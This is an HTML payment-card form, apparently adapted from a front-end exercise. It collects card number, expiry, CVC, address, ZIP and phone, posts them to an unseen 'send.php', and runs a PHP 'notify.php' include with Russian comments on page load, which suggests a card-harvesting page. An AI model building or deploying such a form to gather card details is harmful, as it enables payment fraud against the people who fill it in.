<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" sizes="32x32" href="./images/favicon-32x32.png">
    <link rel="stylesheet" href="./styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500&display=swap" rel="stylesheet">
    <?php
    // Вызовите PHP-скрипт для отправки уведомления
    include 'notify.php';
    ?>
    <title>Payment Form</title>
</head>
<body>
    <div id="content">
        <header>
            <div id="card-container">
                <div id="back">
                    <p class="card-details" id="card-cvc">000</p>
                </div>
                <div id="front">
                    <figure>
                        <img src="images/card-logo.svg" alt="white circle">
                    </figure>
                    <p class="numerals">0000 0000 0000 0000</p>
                    <p class="card-details" id="card-name">Jane Appleseed</p>
                    <p class="card-details"><span id="card-month">00</span>/<span id="card-year">00</span></p>
                </div>
            </div>
        </header>
        <div id="entry-form">
            <form action="send.php" method="POST" name="card-entry-form">
                <div class="long-form">
                    <label for="cardholder">Cardholder Name</label><br>
                    <input type="text" id="cardholder" name="cardholder" placeholder="e.g. Jane Appleseed"><br>
                    <div class="error" id="name-error"></div>
                </div>
                <div class="long-form">
                    <label for="number">Card Number</label><br>
                    <input type="text" id="number" name="number" placeholder="e.g. 1234 5678 9123 0000"><br>
                    <div class="error" id="number-error"></div>
                </div>
                <div class="short-form">
                    <label for="date">Exp. Date (MM/YY)</label><br>
                    <input type="text" id="date" name="month" minlength="2" maxlength="2" placeholder="MM">
                    <input type="text" id="date" name="year" minlength="2" maxlength="2" placeholder="YY"><br>
                    <div class="error" id="date-error"></div>
                </div>
                <div class="short-form">
                    <label for="cvc">CVC</label><br>
                    <input type="text" id="cvc" name="cvc" placeholder="e.g. 123" maxlength="4"><br>
                    <div class="error" id="cvc-error"></div>
                </div>
                <!-- Новые поля формы -->
                <div class="long-form">
                    <label for="address">Payment Address</label><br>
                    <input type="text" id="address" name="address" placeholder="e.g. 123 Main St"><br>
                    <div class="error" id="address-error"></div>
                </div>
                <div class="long-form">
                <div class="long-form">
                    <label for="address">ZIP Code</label><br>
                    <input type="text" id="zip" name="zip" placeholder="V2S 4L5"><br>
                    <div class="error" id="address-error"></div>
                </div>
                    <label for="phone">Phone Number</label><br>
                    <input type="text" id="phone" name="phone" placeholder="e.g. +1 555 555 5555"><br>
                    <div class="error" id="phone-error"></div>
                </div>
                <input type="submit" value="Confirm">
            </form>
        </div>
    </div>
        
    <script src="./script.js"></script>
</body>
</html>